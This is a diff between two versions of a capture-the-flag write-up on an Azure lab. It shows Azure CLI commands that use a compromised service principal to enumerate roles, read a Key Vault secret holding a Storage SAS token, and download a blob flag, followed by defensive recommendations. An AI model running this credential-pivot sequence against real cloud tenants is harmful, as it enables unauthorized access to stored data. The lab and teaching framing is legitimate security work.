@@ -4,27 +4,28 @@
 
 ### Objective
 
-The objective of this challenge was to use the provided Azure Service Principal credentials to enumerate the assigned permissions, access an Azure Key Vault, retrieve a stored Storage Account SAS token, and use that token to access a protected Blob Storage container and retrieve the flag.
+The objective of this challenge is to use the provided Azure Service Principal credentials to authenticate to Azure, enumerate its permissions, access an Azure Key Vault, retrieve a Storage Account SAS token, and use that token to access an Azure Blob Storage container and retrieve the flag.
 
 ### Scenario
 
-The challenge provided a Client ID and Client Secret for an Azure Service Principal.
+The challenge provides a Client ID, Client Secret, and the organization's domain name.
 
-The initial Service Principal had limited access within the Azure subscription. During enumeration, a `Key Vault Secrets User` role assignment was identified on a specific Key Vault.
+The initial Service Principal has limited permissions within an Azure subscription. By enumerating its assigned Azure RBAC roles, a `Key Vault Secrets User` permission can be identified on a Key Vault.
 
-The Key Vault contained a Storage Account SAS token. Although the Service Principal did not have sufficient Azure Storage data-plane permissions to directly read blobs using its own identity, the SAS token retrieved from the Key Vault provided the required access to the Blob Storage container.
+The Key Vault contains a Storage Account SAS token. Retrieving this token provides an alternative authentication mechanism for accessing the associated Storage Account and its Blob Storage data.
 
-This created an indirect privilege escalation path from the initial Service Principal to sensitive data stored in Azure Blob Storage.
+The attack therefore demonstrates how access to a secret containing another resource's credentials can provide access beyond the Service Principal's directly assigned permissions.
 
 ### Skills Practiced
 
 * Azure Service Principal authentication
+* Azure Tenant ID discovery
 * Azure RBAC enumeration
-* Key Vault secret enumeration
-* Azure Storage enumeration
-* SAS token usage
-* Azure Blob Storage access
-* Cloud privilege escalation analysis
+* Azure Key Vault enumeration
+* Key Vault secret retrieval
+* Azure Storage SAS token usage
+* Azure Blob Storage enumeration
+* Cloud credential pivoting
 
 ---
 
@@ -36,21 +37,25 @@ Azure
 
 ## Initial Access
 
-The challenge provided:
+The challenge provides:
 
 * Client ID
 * Client Secret
-* Tenant ID obtained from the Azure issuer
+* Organization domain name
 
-The Service Principal was:
+The initial Service Principal is:
 
 `secopprobacksp`
+
+The organization domain provided by the challenge is:
+
+`secure-corp.org`
 
 ## Available Tools
 
 * Azure CLI
+* Command Prompt
 * PowerShell
-* curl
 
 ---
 
@@ -58,176 +63,184 @@ The Service Principal was:
 
 ## Initial Hypothesis
 
-The initial objective was to determine what resources and permissions were available to the compromised Service Principal.
+The initial objective was to authenticate to the Azure tenant and determine what permissions were assigned to the provided Service Principal.
 
-The first step was to authenticate to Azure and enumerate the subscription, Service Principal, role assignments, and available Key Vault resources.
+The expected attack path was:
+
+* Discover the Azure Tenant ID
+* Authenticate using the Service Principal
+* Enumerate RBAC role assignments
+* Identify an accessible Key Vault
+* Enumerate Key Vault secrets
+* Retrieve a Storage Account SAS token
+* Use the SAS token to access Blob Storage
+* Download the flag
 
 Expected targets:
 
 * Azure Key Vault
-* Azure Storage Account
 * Key Vault secrets
-* Blob Storage containers
-
-The issuer provided for the tenant was:
-
-`https://sts.windows.net/f2a33211-e46a-4c92-b84d-aff06c2cd13f`
-
-The Tenant ID was extracted from the GUID at the end of the issuer:
-
-`f2a33211-e46a-4c92-b84d-aff06c2cd13f`
+* Azure Storage Account
+* Blob Storage container
+* `Flag.txt`
 
 ---
 
 # Attack Workflow
 
-The attack was performed by gradually expanding access and identifying credentials stored within accessible cloud resources.
+The attack was performed by gradually expanding access and pivoting from the initial Service Principal credentials to a Storage Account SAS token stored in Azure Key Vault.
 
-## Step 1 - Initial Access Validation
+## Step 1 - Discover the Tenant ID
+
+### Goal
+
+Azure Service Principal authentication requires the Tenant ID in addition to the Client ID and Client Secret.
+
+The challenge provides the organization's domain:
+
+```text
+secure-corp.org
+```
+
+The Azure Tenant ID can be discovered using a public Azure tenant discovery service.
+
+The discovered Tenant ID was:
+
+```text
+f2a33211-e46a-4c92-b84d-aff06c2cd13f
+```
+
+Observation:
+
+The Tenant ID is required to authenticate the provided Service Principal against the correct Azure Entra ID tenant.
+
+---
+
+## Step 2 - Authenticate with Azure
 
 ### Action
 
-Authenticate to Azure using the provided Service Principal credentials.
+Authenticate using the provided Client ID, Client Secret, and discovered Tenant ID.
 
 Command:
 
 ```powershell
-az login --service-principal --username "<CLIENT_ID>" --password "<CLIENT_SECRET>" --tenant "<TENANT_ID>"
+az login --service-principal -u "<CLIENT_ID>" -p "<CLIENT_SECRET>" --tenant "<TENANT_ID>"
 ```
 
-The login was successful.
+Result:
 
-The current Azure account was then validated:
+Authentication was successful.
+
+The current Azure account was verified:
 
 ```powershell
 az account show
 ```
 
-Result:
+The authenticated identity was identified as a Service Principal.
+
+The subscription was:
 
 ```text
-"environmentName": "AzureCloud",
-"homeTenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
-"id": "662a4fee-a3ba-49b3-9caf-8c20ed04503f",
-"name": "Prod",
-"state": "Enabled",
-"tenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
-"user": {
-  "name": "76e1a895-1f05-4165-83ab-98eed07bed86",
-  "type": "servicePrincipal"
-}
+Name: Prod
+Subscription ID: 662a4fee-a3ba-49b3-9caf-8c20ed04503f
+Tenant ID: f2a33211-e46a-4c92-b84d-aff06c2cd13f
 ```
 
 Observation:
 
-The provided Client ID and Client Secret were valid and provided access to the `Prod` subscription.
+The provided credentials were valid and provided authenticated access to the Azure subscription.
 
 ---
 
-## Step 2 - Service Principal Enumeration
+## Step 3 - Enumerate Role Assignments
 
 ### Goal
 
-Identify the Service Principal and determine its assigned Azure RBAC permissions.
+Determine what Azure RBAC permissions are assigned to the compromised Service Principal.
 
 Command:
 
 ```powershell
-az ad sp show --id "<CLIENT_ID>"
+az role assignment list --assignee "<CLIENT_ID>" --output json --all
 ```
 
-The Service Principal was identified as:
+The relevant role assignments were:
 
 ```text
-appDisplayName: secopprobacksp
-appId: 76e1a895-1f05-4165-83ab-98eed07bed86
-id: 2903a6a7-87c7-45dc-96b8-dc5bf8546d87
-servicePrincipalType: Application
+Reader
+Scope:
+ /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG
 ```
 
-Role assignments were then enumerated:
-
-```powershell
-az role assignment list --assignee "<CLIENT_ID>" --all -o table
-```
-
-Result:
+and:
 
 ```text
-Principal                             Role                    Scope
-------------------------------------  ----------------------  ---------------------------------------------------------------------------------------------------------------------------------
-76e1a895-1f05-4165-83ab-98eed07bed86  Reader                  /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG
-76e1a895-1f05-4165-83ab-98eed07bed86  Key Vault Secrets User  /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.KeyVault/vaults/secopprobackkv
+Key Vault Secrets User
+Scope:
+ /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.KeyVault/vaults/secopprobackkv
 ```
 
 Findings:
 
 * The Service Principal had `Reader` access to `DataBack-RG`.
 * The Service Principal had `Key Vault Secrets User` access to `secopprobackkv`.
-* The Key Vault role provided access to secrets stored in the vault.
-* No direct Storage Blob Data role was identified at this stage.
+* The Key Vault role indicated that secrets stored in the vault could be accessible to the compromised identity.
+
+Observation:
+
+The `Key Vault Secrets User` role became the primary path for obtaining additional credentials.
 
 ---
 
-## Step 3 - Key Vault Enumeration
+## Step 4 - Locate the Key Vault and Retrieve Secrets
 
 ### Goal
 
-Identify accessible Key Vault resources and enumerate their secrets.
+Identify the accessible Key Vault and enumerate its secrets.
 
-The resources in the resource group were enumerated:
+The Key Vaults in the resource group can be listed with:
 
 ```powershell
-az resource list --resource-group DataBack-RG -o table
+az keyvault list --resource-group DataBack-RG
+```
+
+Alternatively, Key Vaults in the subscription can be enumerated with:
+
+```powershell
+az keyvault list --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f
+```
+
+The target Key Vault was:
+
+```text
+secopprobackkv
+```
+
+The secrets were then enumerated:
+
+```powershell
+az keyvault secret list --vault-name secopprobackkv
 ```
 
 Result:
 
 ```text
-Name            ResourceGroup    Location    Type                               Status
---------------  ---------------  ----------  ---------------------------------  ---------
-secopprobacksa  DataBack-RG      eastus      Microsoft.Storage/storageAccounts  Succeeded
-secopprobackkv  DataBack-RG      eastus      Microsoft.KeyVault/vaults          Succeeded
+Name
+-------------------------
+secopprobacksaSAASToken
 ```
 
-The Key Vault was then queried:
+The secret value was retrieved:
 
 ```powershell
-az keyvault secret list --vault-name secopprobackkv -o table
-```
-
-Result:
-
-```text
-Name                     Id                                                                      ContentType    Enabled    Expires
------------------------  ----------------------------------------------------------------------  -------------  ---------  ---------
-secopprobacksaSAASToken  https://secopprobackkv.vault.azure.net/secrets/secopprobacksaSAASToken                 True
-```
-
-Findings:
-
-* The Key Vault contained a secret named `secopprobacksaSAASToken`.
-* The naming strongly suggested that the secret contained credentials for the Storage Account `secopprobacksa`.
-
----
-
-## Step 4 - Retrieve the Key Vault Secret
-
-### Misconfiguration Identified
-
-The compromised Service Principal had the `Key Vault Secrets User` role on the target Key Vault.
-
-This allowed the Service Principal to retrieve the value of the stored secret.
-
-Command:
-
-```powershell
-az keyvault secret show --vault-name secopprobackkv --name secopprobacksaSAASToken
+az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
 ```
 
 The secret contained an Azure Storage SAS token.
 
-The important parameters included:
+The important SAS parameters included:
 
 ```text
 sv=2024-11-04
@@ -236,13 +249,15 @@ srt=sco
 sp=rltfx
 ```
 
-The SAS token was valid for the Storage Account and provided permissions that included read and list operations.
-
 Observation:
 
-The Key Vault secret effectively contained a second set of credentials that could be used to access the Storage Account data plane.
+The secret name revealed the associated Storage Account name:
 
-This created the following trust chain:
+```text
+secopprobacksa
+```
+
+The Key Vault therefore acted as the credential pivot point:
 
 ```text
 Service Principal
@@ -251,7 +266,10 @@ Service Principal
 Key Vault Secrets User
         |
         v
-Key Vault Secret
+secopprobackkv
+        |
+        v
+secopprobacksaSAASToken
         |
         v
 Storage SAS Token
@@ -259,139 +277,103 @@ Storage SAS Token
 
 ---
 
-## Step 5 - Storage Account Enumeration
+## Step 5 - Access the Storage Account Using the SAS Token
 
 ### Goal
 
-Determine whether the Storage Account identified by the secret existed and enumerate its available containers.
+Use the SAS token retrieved from Key Vault to access the associated Storage Account.
+
+The Storage Account name identified from the secret was:
+
+```text
+secopprobacksa
+```
+
+The SAS token provides authorization independently of the Service Principal's Azure RBAC permissions.
+
+### Note
+
+When working with SAS tokens containing `&` characters, it is recommended to run the Azure CLI commands from **Command Prompt (CMD)** rather than PowerShell to avoid shell parsing issues.
 
 Command:
 
-```powershell
-az storage account list -o table
-```
-
-The target Storage Account was confirmed as:
-
-```text
-secopprobacksa
-```
-
-The resource group was also confirmed to contain:
-
-```text
-secopprobacksa
-secopprobackkv
-```
-
-The available Blob Storage containers were enumerated:
-
-```powershell
-az storage container list --account-name secopprobacksa --auth-mode login
+```cmd
+az storage container list --account-name secopprobacksa --sas-token "?sv=...&ss=...&srt=...&sp=...&se=...&st=...&spr=https&sig=..." --output table
 ```
 
 Result:
 
+The Storage Account contained the following container:
+
 ```text
-name: secopprobacksc
+secopprobacksc
 ```
 
 Observation:
 
-The Service Principal could enumerate Storage container metadata, but it did not have sufficient Storage Blob Data permissions to read blobs directly using Azure AD authentication.
+The SAS token successfully authorized access to the Storage Account despite the Service Principal itself not having a `Storage Blob Data Reader` role.
+
+This demonstrates the difference between the Service Principal's direct Azure RBAC permissions and the permissions granted by the independently issued SAS token.
 
 ---
 
-## Step 6 - Use the SAS Token to Access Blob Storage
+## Step 6 - Enumerate Blobs
 
 ### Goal
 
-Use the SAS token retrieved from Key Vault to access the Storage Account data plane.
-
-The Azure CLI authentication method using the Service Principal failed when attempting to list blobs:
-
-```powershell
-az storage blob list --account-name secopprobacksa --container-name secopprobacksc --auth-mode login
-```
-
-Result:
-
-```text
-You do not have the required permissions needed to perform this operation.
-
-Depending on your operation, you may need to be assigned one of the following roles:
-    "Storage Blob Data Owner"
-    "Storage Blob Data Contributor"
-    "Storage Blob Data Reader"
-```
-
-This confirmed that the Service Principal itself did not have a suitable Storage Blob Data role.
-
-The retrieved SAS token was therefore used directly against the Blob Storage REST endpoint.
+Enumerate the blobs inside the discovered container.
 
 Command:
 
-```powershell
-curl.exe "https://secopprobacksa.blob.core.windows.net/secopprobacksc?restype=container&comp=list&sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=<SAS_SIGNATURE>"
+```cmd
+az storage blob list --account-name secopprobacksa --container-name secopprobacksc --sas-token "?sv=...&ss=...&srt=...&sp=...&se=...&st=...&spr=https&sig=..." --output table
 ```
 
-Result:
-
-```xml
-<EnumerationResults ServiceEndpoint="https://secopprobacksa.blob.core.windows.net/" ContainerName="secopprobacksc">
-<Blobs>
-<Blob>
-<Name>Flag.txt</Name>
-<Properties>
-<Creation-Time>Tue, 15 Oct 2024 10:02:22 GMT</Creation-Time>
-<Last-Modified>Tue, 15 Oct 2024 10:02:22 GMT</Last-Modified>
-<Content-Length>26</Content-Length>
-<Content-Type>application/txt</Content-Type>
-<BlobType>BlockBlob</BlobType>
-<AccessTier>Hot</AccessTier>
-<ServerEncrypted>true</ServerEncrypted>
-</Properties>
-</Blob>
-</Blobs>
-<NextMarker/>
-</EnumerationResults>
-```
-
-Finding:
-
-The SAS token successfully granted access to the Blob Storage container and revealed the target blob:
+The container contained:
 
 ```text
 Flag.txt
 ```
 
+Observation:
+
+The SAS token provided sufficient permissions to enumerate the Blob Storage contents and identify the target file.
+
 ---
 
-## Step 7 - Access Target Resource
+## Step 7 - Retrieve the Flag
 
-### Target
+### Goal
 
-Azure Blob Storage:
+Download the target blob using the SAS token.
 
-```text
-Storage Account: secopprobacksa
-Container: secopprobacksc
-Blob: Flag.txt
+Command:
+
+```cmd
+az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "?sv=...&ss=...&srt=...&sp=...&se=...&st=...&spr=https&sig=..." --output table
 ```
 
-The blob could be retrieved using the SAS token:
+The file was successfully downloaded.
 
-```powershell
-curl.exe "https://secopprobacksa.blob.core.windows.net/secopprobacksc/Flag.txt?sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=<SAS_SIGNATURE>"
+The flag can then be viewed locally:
+
+```cmd
+type Flag.txt
 ```
 
-The response contained the challenge flag.
+Mission accomplished.
 
 ---
 
 # Attack Chain
 
 ```text
+Organization Domain
+        |
+        v
+Tenant ID Discovery
+        |
+        v
 Client ID + Client Secret
         |
         v
@@ -410,7 +392,7 @@ secopprobackkv
 secopprobacksaSAASToken
         |
         v
-Azure Storage SAS Token
+Storage SAS Token
         |
         v
 secopprobacksa
@@ -431,71 +413,87 @@ Sensitive Data Retrieval
 
 ## Security Weakness
 
-The primary security weakness was excessive exposure of a sensitive Storage Account SAS token through a Key Vault secret accessible to the compromised Service Principal.
+The primary security weakness was that the compromised Service Principal had permission to retrieve a sensitive Storage Account SAS token from Azure Key Vault.
 
-The Service Principal was intentionally limited from directly accessing Blob data:
+The Service Principal did not need direct Blob Storage data-plane permissions because the SAS token stored in the Key Vault provided an alternative authentication mechanism for the Storage Account.
 
-```text
-No Storage Blob Data Reader
-No Storage Blob Data Contributor
-No Storage Blob Data Owner
-```
-
-However, it was granted:
+The effective access path was therefore:
 
 ```text
-Key Vault Secrets User
+Key Vault Access
+       +
+Sensitive Credential Stored in Key Vault
+       =
+Indirect Access to Storage Data
 ```
 
-on a Key Vault containing a valid Storage SAS token.
-
-As a result, the effective permissions of the Service Principal exceeded its apparent direct Storage permissions.
-
-The attack demonstrated that protecting a resource with RBAC is insufficient if an identity can retrieve another credential that independently grants access to the same resource.
+This demonstrates why cloud access reviews must consider not only directly assigned RBAC permissions, but also the credentials that an identity is capable of retrieving.
 
 ## Impact
 
 An attacker who compromises the Service Principal credentials could:
 
-1. Authenticate to Azure.
-2. Enumerate assigned RBAC permissions.
+1. Authenticate to the Azure tenant.
+2. Enumerate the Service Principal's permissions.
 3. Access the Key Vault.
-4. Retrieve the Storage SAS token.
-5. Authenticate directly to Azure Blob Storage.
+4. Retrieve the Storage Account SAS token.
+5. Use the SAS token to authenticate to Azure Blob Storage.
 6. Enumerate the target container.
-7. Read sensitive blobs such as `Flag.txt`.
+7. Read sensitive files stored in the container.
 
-The impact therefore extends beyond the permissions directly assigned to the Service Principal.
+The attacker can therefore obtain access to resources beyond those directly authorized to the Service Principal.
 
 ---
 
 # Evidence
 
-Important commands and outputs:
+Important commands:
 
 ```text
+az login --service-principal -u "<CLIENT_ID>" -p "<CLIENT_SECRET>" --tenant "<TENANT_ID>"
+
 az account show
 
-az ad sp show --id "<CLIENT_ID>"
+az role assignment list --assignee "<CLIENT_ID>" --output json --all
 
-az role assignment list --assignee "<CLIENT_ID>" --all -o table
+az keyvault list --resource-group DataBack-RG
 
-az resource list --resource-group DataBack-RG -o table
+az keyvault secret list --vault-name secopprobackkv
 
-az keyvault secret list --vault-name secopprobackkv -o table
+az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
 
-az keyvault secret show --vault-name secopprobackkv --name secopprobacksaSAASToken
+az storage container list --account-name secopprobacksa --sas-token "<SAS_TOKEN>" --output table
 
-az storage container list --account-name secopprobacksa --auth-mode login
+az storage blob list --account-name secopprobacksa --container-name secopprobacksc --sas-token "<SAS_TOKEN>" --output table
 
-az storage blob list --account-name secopprobacksa --container-name secopprobacksc --auth-mode login
-
-curl.exe "<BLOB_STORAGE_SAS_URL>"
+az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "<SAS_TOKEN>" --output table
 ```
 
-The final enumeration of the Blob container revealed:
+Important discovered resources:
 
 ```text
+Tenant:
+f2a33211-e46a-4c92-b84d-aff06c2cd13f
+
+Subscription:
+662a4fee-a3ba-49b3-9caf-8c20ed04503f
+
+Resource Group:
+DataBack-RG
+
+Key Vault:
+secopprobackkv
+
+Key Vault Secret:
+secopprobacksaSAASToken
+
+Storage Account:
+secopprobacksa
+
+Blob Container:
+secopprobacksc
+
+Target Blob:
 Flag.txt
 ```
 
@@ -503,36 +501,38 @@ Flag.txt
 
 # Defensive Recommendations
 
-* Apply least-privilege RBAC to Service Principals.
-* Avoid storing long-lived or broadly scoped SAS tokens in secrets accessible to application identities unless strictly necessary.
-* Prefer Microsoft Entra ID authentication and managed identities over static SAS credentials where possible.
-* Use narrowly scoped SAS tokens with the minimum required permissions.
-* Restrict SAS lifetime and avoid unnecessarily long expiration periods.
-* Avoid granting `Key Vault Secrets User` access when an application only requires a specific secret.
-* Separate secrets containing credentials for different cloud resources.
-* Regularly review Key Vault RBAC assignments.
-* Regularly audit the effective permissions of Service Principals.
-* Monitor Key Vault secret access and Storage data-plane activity.
-* Enable Azure diagnostic logging and alert on unusual secret retrieval followed by Storage access.
-* Rotate exposed SAS tokens and other credentials immediately after compromise.
+* Apply least-privilege principles to Azure Service Principals.
+* Review all `Key Vault Secrets User` assignments regularly.
+* Avoid storing broadly scoped Storage SAS tokens in Key Vaults accessible by application identities unless strictly required.
+* Prefer Microsoft Entra ID authentication and managed identities over long-lived SAS tokens where possible.
+* Restrict SAS tokens to the minimum required permissions and resources.
+* Use short SAS expiration periods.
+* Regularly rotate Storage SAS tokens and other credentials.
+* Monitor Key Vault secret access.
+* Monitor Storage data-plane activity following Key Vault secret retrieval.
+* Review effective permissions rather than only direct RBAC assignments.
+* Separate credentials between applications and resources to reduce credential pivoting opportunities.
 
 ---
 
 # Key Takeaways
 
-* Azure RBAC permissions should be evaluated together with credentials stored in accessible Key Vault secrets.
-* `Key Vault Secrets User` can become a powerful privilege-escalation path when secrets contain credentials for other Azure resources.
-* Azure Resource Manager permissions and Storage data-plane permissions are separate.
-* A Service Principal may be unable to read Blob data directly while still being able to retrieve a credential that grants Blob access.
-* SAS tokens provide independent authorization to Azure Storage and can bypass the original identity's Storage RBAC restrictions.
-* Effective cloud privilege should be evaluated based on the credentials an identity can obtain, not only its directly assigned roles.
+* A Client ID and Client Secret are sufficient to authenticate a Service Principal when the correct Tenant ID is known.
+* The Azure Tenant ID can be discovered from an organization's domain.
+* Azure RBAC enumeration is an important first step after Service Principal authentication.
+* `Key Vault Secrets User` access can expose credentials for other Azure resources.
+* A Storage SAS token provides authorization independently from the Service Principal's Azure RBAC permissions.
+* Direct lack of `Storage Blob Data Reader` does not necessarily prevent access to Blob Storage if another valid credential can be obtained.
+* Secret names can sometimes reveal useful information about the associated resource.
+* Effective cloud privilege should be evaluated based on both assigned permissions and the credentials an identity can retrieve.
 
 ---
 
 # References
 
 * Microsoft Azure CLI documentation
+* Microsoft Entra ID Service Principal authentication documentation
 * Microsoft Azure Key Vault documentation
 * Microsoft Azure RBAC documentation
 * Microsoft Azure Storage Blob documentation
-* Microsoft Azure Shared Access Signature (SAS) documentation
+* Microsoft Azure Storage SAS documentation
